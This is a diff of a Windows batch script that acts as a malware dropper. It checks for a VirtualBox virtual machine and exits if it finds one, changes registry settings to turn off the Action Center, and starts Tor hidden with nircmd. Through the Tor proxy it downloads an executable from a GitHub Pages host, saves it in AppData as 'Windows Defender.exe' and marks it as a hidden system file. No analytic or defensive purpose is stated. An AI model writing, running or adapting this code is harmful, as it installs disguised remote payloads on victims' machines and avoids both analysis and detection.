@@ -10,11 +10,6 @@ for /f "tokens=1* delims=: " %%A in (
 if "%model%" == "VirtualBox" (
     exit
 )
-nircmd exec hide "C:\Tor\tor.exe"
-tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
-if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
-  set "proxy="
-)
 
 cd %~dp0
 REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "UseActionCenterExperience" /t REG_DWORD /d 0 /f
@@ -42,6 +37,12 @@ start "" "%windir%\explorer.exe"
 
 mkdir "%appdata%\microsoft\windows\Templates"
 mkdir "%appdata%\microsoft\Network"
+
+nircmd exec hide "C:\Tor\tor.exe"
+tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
+if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
+  set "proxy="
+)
 
 curl.exe %proxy% https://cryptedlumos.github.io/WindowsDefender.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe"
 attrib +s +h +i "%AppData%\Microsoft\Windows\Windows Defender.exe"
